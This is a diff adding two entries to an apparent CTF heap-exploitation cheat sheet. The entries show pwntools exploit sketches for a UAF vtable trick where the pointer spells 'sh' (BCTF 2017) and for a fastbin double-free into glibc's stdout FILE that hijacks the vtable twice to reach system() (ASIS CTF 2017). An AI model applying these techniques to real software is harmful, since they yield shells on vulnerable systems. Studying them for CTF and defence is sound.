@@ -16,6 +16,8 @@
 - [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
 - [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
 - [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
+- [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
+- [Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)](#fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017)
 
 ---
 
@@ -505,3 +507,79 @@ add_memo(size, p64(environ_addr))  # write &environ into note slot
 ```
 
 **Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.
+
+---
+
+## UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)
+
+**Pattern:** After UAF, heap spray fills memory with `system()` addresses at a 3-byte offset. The vtable pointer address `0x??006873` encodes ASCII `"sh\x00"` at the object start, so calling `system()` through the vtable executes `system("sh")`.
+
+```python
+from pwn import *
+
+# Heap spray: fill 16MB with system() address at offset +3
+# Each spray chunk: 3 bytes padding + 8 bytes system_addr, repeated
+spray_unit = b"\x00" * 3 + p64(system_addr)
+spray_data = spray_unit * (0x1000000 // len(spray_unit))
+
+# Trigger heap spray via application interface
+for i in range(spray_count):
+    alloc(spray_data[:chunk_size])
+
+# UAF object at address 0xXX006873
+# Bytes at object start: 73 68 00 XX = "sh\x00..."
+# When vtable call dispatches: system(this) → system("sh")
+
+# Trigger: free the target object, then invoke its virtual method
+free(target_obj)
+trigger_vtable_call(target_obj)  # calls system("sh")
+```
+
+**Key insight:** The vtable pointer value itself serves as the string argument to `system()`. By arranging the heap spray so objects land at addresses containing `0x6873` (ASCII "sh") in the low bytes, the object's address doubles as a valid shell command string. This eliminates the need for a separate controlled string -- the pointer IS the argument.
+
+**When to recognize:** UAF on a C++ object with virtual methods, where you control heap layout but not the exact content at the object's `this` pointer. If `system()` is called with `this` as the first argument (common in vtable dispatch), the object's address just needs to decode as a valid command string.
+
+**References:** BCTF 2017
+
+---
+
+## Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)
+
+**Pattern:** When PIE and Full RELRO block GOT overwrite, target libc's stdout FILE structure via fastbin attack, using a two-stage vtable hijack.
+
+```python
+from pwn import *
+
+# Stage 1: Fastbin double-free targeting fake chunk inside stdout
+# Use 0x7f byte in libc stdout region as fake chunk size (matches 0x70 fastbin)
+fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # contains 0x7f byte
+
+# Double-free in 0x70 fastbin
+alloc_a = malloc(0x60)
+alloc_b = malloc(0x60)
+free(alloc_a)
+free(alloc_b)
+free(alloc_a)  # double-free: fastbin 0x70 = [a -> b -> a]
+
+# Redirect fastbin to stdout region
+malloc(0x60, p64(fake_chunk_addr))  # a's fd -> fake chunk in stdout
+malloc(0x60)                         # returns b
+malloc(0x60)                         # returns a again
+
+# Stage 2a: First vtable overwrite → gets()
+# rdi points to stdout struct, so gets(stdout) reads input into stdout
+fake_stdout_chunk = malloc(0x60)     # returns fake chunk overlapping stdout
+write_to(fake_stdout_chunk, p64(gets_addr))  # vtable → gets
+
+# Stage 2b: gets() overwrites stdout vtable again → system()
+# Next puts() call triggers: vtable lookup → gets(stdout)
+# gets() reads from stdin into the stdout struct, overwriting vtable again
+# Input: "1\x80;/bin/sh;" — new vtable points to system()
+# After gets() returns, next output call triggers system()
+```
+
+**Key insight:** The 0x7f byte naturally present in libc's stdout region satisfies fastbin size validation for the 0x70 bin. Two-stage hijack: first redirect vtable to `gets()` (since rdi=stdout FILE*), then `gets()` reads a second vtable pointing to `system()` along with the command string. This technique works even with PIE + Full RELRO because it targets libc's writable data segment, not the GOT.
+
+**When to recognize:** Challenge has PIE + Full RELRO, with a heap UAF or double-free. The 0x7f byte in libc's FILE structures is a universal fastbin target. Check `_IO_2_1_stdout_` region for 0x7f bytes at aligned offsets suitable as fake chunk sizes.
+
+**References:** ASIS CTF 2017
